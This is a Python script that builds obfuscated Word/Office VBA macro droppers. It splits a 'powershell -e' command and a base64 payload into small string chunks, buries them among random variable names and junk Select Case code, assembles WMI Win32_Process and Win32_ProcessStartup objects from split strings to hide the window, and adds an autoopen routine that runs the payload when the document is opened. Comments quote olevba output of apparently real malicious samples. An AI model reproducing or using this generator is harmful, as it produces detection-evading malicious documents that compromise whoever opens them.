import random
import os
import math
import string

used_variable_names = []

def generate_variable_name():
    first_character = random.choice(string.ascii_letters)
    number_of_additional_characters = random.randint(5, 6)
    additional_character_options = list(string.ascii_letters)
    for d in string.digits:
        additional_character_options.append(d)

    # there is a much higher appearance rate of _ than letters/digits, add 20 of them to increase frequency

    underscore_counter = 0
    while underscore_counter < 20:
        additional_character_options.append("_")
        underscore_counter = underscore_counter + 1

    var_length_counter = 0

    var_to_return = first_character

    while var_length_counter < number_of_additional_characters:
        var_to_return = str(var_to_return + random.choice(additional_character_options))
        var_length_counter = var_length_counter + 1

    return var_to_return

def get_new_variable_name():
    while True:
        candidate = generate_variable_name()
        if candidate not in used_variable_names:
            used_variable_names.append(candidate)
            return candidate

'''
   Select Case i28839_9
         Case 295330195
M4__9_7 = (n_09_113 * Fix(237213327 / CBool(l3386_20))) - I4_2_9_ / Oct(365202573) / 251948038 + CStr(S_3_66_) - 358443852 + ChrB(X7__1259)
End Select
   Select Case T048_6
         Case 123926770
l7230682 = (p__9_7 * Fix(552349161 / CBool(f4_____9))) - C_7__3 / Oct(650875901) / 745484596 + CStr(r_99_1) - 29972076 + ChrB(X45700)
End Select
   Select Case l_9665_4
         Case 268175503
i49_80 = (J8_418_ * Fix(928174828 / CBool(t85_594))) - G0405214 / Oct(441985149) / 161706374 + CStr(B67_4___) - 200113004 + ChrB(L5_4___1)
End Select
'''

def generate_nonsense_case_statement():
    case_vba = "\tSelect Case {}\r\n".format(get_new_variable_name()) + \
                "\t\tCase {}\r\n".format(str(random.randint(3000000, 999999999))) + \
                "{} = ({} * Fix({} / CBool({}))) - {} / Oct({}) / {} + CStr({}) - {} + ChrB({})\r\n".format(
                    get_new_variable_name(),  # initial var
                    get_new_variable_name(),  # after first {
                    str(random.randint(3000000, 999999999)),  # Fix(this
                    get_new_variable_name(),  # CBool(this
                    get_new_variable_name(),  # CBool() - this /
                    str(random.randint(3000000, 999999999)),  # Oct(this)
                    str(random.randint(3000000, 999999999)),  # Oct() / this +
                    get_new_variable_name(),  # CStr(this)
                    str(random.randint(3000000, 999999999)),  # CStr() - this +
                    get_new_variable_name()  # ChrB(this)
                ) + \
                "End Select\r\n"
    return case_vba

def get_cases(min, max):
    return_vba = ''
    case_counter = 0
    cases_to_insert = random.randint(min, max)
    while case_counter < cases_to_insert:
        return_vba = return_vba + generate_nonsense_case_statement()
        case_counter = case_counter + 1
    return return_vba

def generate_nonsense_function():
    function_vba = "Function {}()\r\n".format(get_new_variable_name())
    number_of_cases = random.randint(6, 17)
    case_count = 0
    while case_count < number_of_cases:
        function_vba = function_vba + generate_nonsense_case_statement()
        case_count = case_count + 1
    function_vba = function_vba + "End Function\r\n"
    return function_vba

'''
77ac.olevba:j40_1__ = F965_0 + "winmgmts:Win32" + j373_5 + "_Process" + O_25_51
846f.olevba:D76__47 = n065_5 + "winmgmts:Win32" + "_Process" + R_3_4_6
ff02.olevba:F29__4 = i_0_04_2 + "winmgmts:Win32" + i_16__ + "_Process" + z510_1
'''
def generate_obfuscated_win32_process():
    this_var_name = get_new_variable_name()
    vba_line = "{} = {} + \"winmgmts:Win32\" + {} + \"_Process\" + {}\r\n".format(
        this_var_name,
        get_new_variable_name(),
        get_new_variable_name(),
        get_new_variable_name()
    )
    return {"var": this_var_name,
            "vba_line": vba_line}

'''
77ac.olevba:Set S04___ = GetObject(W57640 + i253_50_ + Q6___63)
846f.olevba:Set Z1790_07 = GetObject(a_38080 + O1_161 + F63__2_2)
ff02.olevba:Set U9814_2_ = GetObject(A_12_92 + v1991998 + U__5062)
'''
def generate_win32_process_startup_object(win32_process_var_name):
    process_startup_var = get_new_variable_name()
    vba_line = "{} = GetObject({} + {} + {})\r\n".format(
        process_startup_var,
        get_new_variable_name(),
        win32_process_var_name,
        get_new_variable_name()
    )
    return {"var": process_startup_var,
            "vba_line": vba_line}

'''
77ac.olevba:S04___.ShowWindow = f_550386 + 717454 - 717454 + m0382_7
846f.olevba:Z1790_07.ShowWindow = O_9_556 + 73271 - 73271 + J66_38
ff02.olevba:U9814_2_.ShowWindow = G23_1_ + 952579 - 952579 + U9___08
'''

def generate_win32_process_startup_showwindow(win32_process_startup_var_name):
    number_to_subtract_from_itself = str(random.randint(30000, 99999))
    vba_line = '{}.ShowWindow = {} + {} - {} + {}\r\n'.format(
        win32_process_startup_var_name,
        get_new_variable_name(),
        number_to_subtract_from_itself,
        number_to_subtract_from_itself,
        get_new_variable_name()
    )
    return vba_line

'''
77ac.olevba:i253_50_ = X159_269 + "winmgmts:Win32" + s47661 + "_ProcessStartup" + M2_65_
846f.olevba:O1_161 = L10517 + "winmgmts:Win32" + "_ProcessStartup" + J597_154
ff02.olevba:v1991998 = w5_34067 + "winmgmts:Win32" + Q_51_0_3 + "_ProcessStartup" + S72405
'''
def generate_obfuscated_win32_process_startup():
    this_var_name = get_new_variable_name()
    vba_line = "{} = {} + \"winmgmts:Win32\" + {} + \"_ProcessStartup\" + {}\r\n".format(
        this_var_name,
        get_new_variable_name(),
        get_new_variable_name(),
        get_new_variable_name()
    )
    return {"var": this_var_name,
            "vba_line": vba_line}

'''
77ac.olevba:o2_34_2_ = GetObject(r098_70 + j40_1__ + E2_079).Create((z31563 + o7_572_ + X69103_3 + B692634 + s7_05__ + X879459), w0_330, S04___, j33753)
846f.olevba:S__2953 = GetObject(C2_0_81 + D76__47 + H20_560_).Create((E56065 + Q1719__3 + E31_6_26 + i_8__6_6 + j31_197 + r5__225), C58685, Z1790_07, q_51130)
ff02.olevba:M825_2_ = GetObject(l073__1 + F29__4 + L78059).Create((s064___ + p84753 + Q86977_ + F6_1_55 + K7_9413), m82_5009, U9814_2_, E_10_47_)
'''
def generate_process_create(win32_process_varname, win32_process_startup_varname, reassembly_function_name):
    process_create_function_name = get_new_variable_name()
    vba_line = "{} = GetObject({} + {} + {}).Create(({} + {} + {} + {} + {} + {}), {}, {}, {})\r\n".format(
        process_create_function_name,
        get_new_variable_name(),
        win32_process_varname,
        get_new_variable_name(),
        get_new_variable_name(),
        reassembly_function_name,
        get_new_variable_name(),
        get_new_variable_name(),
        get_new_variable_name(),
        get_new_variable_name(),
        get_new_variable_name(),
        win32_process_startup_varname,
        get_new_variable_name()
    )
    return vba_line

def generate(dropperbase64):
    playbook = list()

    process_creation_args = "rsheLl -e "
    remaining = process_creation_args + dropperbase64
    chunked_list = []

    while len(remaining) > 0:
        this_chunk_size = random.randint(3, 6)
        if this_chunk_size < len(remaining):
            chunked_list.append(remaining[0:this_chunk_size])
            remaining = remaining[this_chunk_size:]
        else:
            chunked_list.append(remaining)
            remaining = ""


    vba = ''
    reassembly_vba = ''
    process_creation_vba = ''
    auto_open_vba = ''

    reassembly_tier_1_funcs = []  # this is the set of functions that will be passed to the CreateProcess.create method, each reconstructing part of the base64
    reassembly_tier_2_vars = []  # this is the set of variables that needs to be reassembled into tier 1 after the base64 reassembly
    reassembly_tier_2_vba = []

    ##  create the tier 2 reassembly - base64 gets reassembled into variables

    while len(chunked_list) > 0:

        chunk_counter = 0
        number_of_reassemblies_this_line = random.randint(5, 9)
        this_line_var_name = get_new_variable_name()
        reassembly_tier_2_vars.append(this_line_var_name)
        this_vba_line = "{} = ".format(this_line_var_name)
        if number_of_reassemblies_this_line > len(chunked_list):
            number_of_reassemblies_this_line = len(chunked_list)
        while chunk_counter < number_of_reassemblies_this_line:
            this_vba_line = this_vba_line + '"' + chunked_list[0] + '"' + ' + '
            chunked_list = chunked_list[1:]
            chunk_counter = chunk_counter + 1
        this_vba_line = this_vba_line[0:-3] + '\r\n'
        reassembly_tier_2_vba.append(this_vba_line)

    ##  create the tier 1 reassembly - create functions that will be run by the CreateProcess.create method

    while len(reassembly_tier_2_vba) > 0:
        new_function_counter = 0
        number_of_reassemblies_this_function = random.randint(6, 12)
        this_function_name = get_new_variable_name()
        reassembly_tier_1_funcs.append(this_function_name)
        if len(reassembly_tier_2_vba) < number_of_reassemblies_this_function:
            number_of_reassemblies_this_function = len(reassembly_tier_2_vba)
        reassembly_vba = reassembly_vba + "Function {}()\r\n".format(this_function_name)
        while new_function_counter < number_of_reassemblies_this_function and len(reassembly_tier_2_vba) > 0:
            reassembly_vba = reassembly_vba + get_cases(min=1, max=3)
            reassembly_vba = reassembly_vba + reassembly_tier_2_vba[0]
            reassembly_tier_2_vba = reassembly_tier_2_vba[1:]
            new_function_counter = new_function_counter + 1
        reassembly_vba = reassembly_vba + "{} = {}\r\n".format(
            this_function_name,
            ' + '.join(reassembly_tier_2_vars[0:number_of_reassemblies_this_function])
        )
        reassembly_tier_2_vars = reassembly_tier_2_vars[number_of_reassemblies_this_function:]
        reassembly_vba = reassembly_vba + get_cases(min=1, max=3)
        reassembly_vba = reassembly_vba + "End Function\r\n"

    ## create the special variables needed to create a process

    reassembly_function_name = get_new_variable_name()
    reassembly_function_arg = get_new_variable_name()

    process_creation_vba = process_creation_vba + "Function {}({}, {})\r\nOn Error Resume Next\r\n".format(
        reassembly_function_name,
        reassembly_function_arg,
        get_new_variable_name()
    )

    process_creation_vba = process_creation_vba + get_cases(min=2, max=4)

    win32_process_obfuscated_string = generate_obfuscated_win32_process()
    win32_process_startup_obfuscated_string = generate_obfuscated_win32_process_startup()


    process_creation_vba = process_creation_vba + win32_process_obfuscated_string['vba_line']
    process_creation_vba = process_creation_vba + get_cases(min=4, max=7)
    process_creation_vba = process_creation_vba + win32_process_startup_obfuscated_string['vba_line']
    process_creation_vba = process_creation_vba + get_cases(min=4, max=7)
    process_creation_vba = process_creation_vba + generate_win32_process_startup_showwindow(
        win32_process_startup_obfuscated_string['var']
    )
    process_creation_vba = process_creation_vba + get_cases(min=4, max=7)
    process_creation_vba = process_creation_vba + generate_process_create(
        win32_process_varname=win32_process_obfuscated_string['var'],
        win32_process_startup_varname=win32_process_startup_obfuscated_string['var'],
        reassembly_function_name=reassembly_function_arg
    )
    process_creation_vba = process_creation_vba + get_cases(min=4, max=7)
    process_creation_vba = process_creation_vba + "End Function\r\n"


    ## create auto_open

    auto_open_vba = auto_open_vba + "Sub autoopen()\r\nOn Error Resume Next\r\n"

    auto_open_vba = auto_open_vba + get_cases(2, 4)

    auto_open_vba = auto_open_vba + "{} {} + \"powe\" + {}, {} + {} + {} + {}\r\n".format(
        reassembly_function_name,
        get_new_variable_name(),
        " + ".join(reassembly_tier_1_funcs),
        get_new_variable_name(),
        get_new_variable_name(),
        get_new_variable_name(),
        get_new_variable_name()
    )

    auto_open_vba = auto_open_vba + get_cases(2, 4)

    auto_open_vba = auto_open_vba + "End Sub\r\n"
    vba = vba + reassembly_vba
    vba = vba + process_creation_vba
    vba = vba + auto_open_vba


    #  cleanup and return
    used_variable_names = []
    playbook.append({'add_vba_module': vba})
    return playbook

if __name__ == '__main__':
    # print(generate_variable_name())
    # print(generate_nonsense_case_statement())
    #print(generate_nonsense_function())
    import payloads
    print(generate(payloads.get_payloads()[0]))
